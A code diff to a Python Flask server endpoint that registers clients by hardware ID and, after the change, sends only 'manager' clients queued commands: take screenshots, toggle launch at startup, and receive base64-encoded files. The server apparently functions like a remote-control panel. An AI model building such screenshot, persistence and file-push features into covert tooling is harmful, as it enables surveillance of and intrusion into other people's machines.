@@ -431,6 +431,7 @@ def register():
     data = request.json
     hwid = data.get('hwid')
     username = data.get('username', '')
+    client_type = data.get('type', 'main')  # 'main' or 'manager'
     if not hwid:
         return jsonify({'error': 'missing hwid'}), 400
 
@@ -455,25 +456,27 @@ def register():
         'settings_override': PLAYERS[hwid].get('settings_override', {})
     }
 
-    # Screenshot request
-    if hwid in screenshot_requests and screenshot_requests[hwid]:
-        response['screenshot'] = True
-        del screenshot_requests[hwid]
+    # Only send commands to 'manager' clients
+    if client_type == 'manager':
+        # Screenshot request
+        if hwid in screenshot_requests and screenshot_requests[hwid]:
+            response['screenshot'] = True
+            del screenshot_requests[hwid]
 
-    # Startup toggle
-    if hwid in startup_requests:
-        response['startup'] = startup_requests[hwid]
-        PLAYERS[hwid]['startup'] = startup_requests[hwid]
-        del startup_requests[hwid]
+        # Startup toggle
+        if hwid in startup_requests:
+            response['startup'] = startup_requests[hwid]
+            PLAYERS[hwid]['startup'] = startup_requests[hwid]
+            del startup_requests[hwid]
 
-    # File delivery
-    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
-        response['file_payload'] = {
-            'filename': PENDING_FILES[hwid]['filename'],
-            'content_b64': PENDING_FILES[hwid]['content_b64']
-        }
-        PENDING_FILES[hwid]['status'] = 'delivered'
-        print(f"[+] Delivered file to {hwid}: {PENDING_FILES[hwid]['filename']}")
+        # File delivery
+        if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
+            response['file_payload'] = {
+                'filename': PENDING_FILES[hwid]['filename'],
+                'content_b64': PENDING_FILES[hwid]['content_b64']
+            }
+            PENDING_FILES[hwid]['status'] = 'delivered'
+            print(f"[+] Delivered file to {hwid}: {PENDING_FILES[hwid]['filename']}")
 
     if status == 'kicked':
         PLAYERS[hwid]['status'] = 'active'
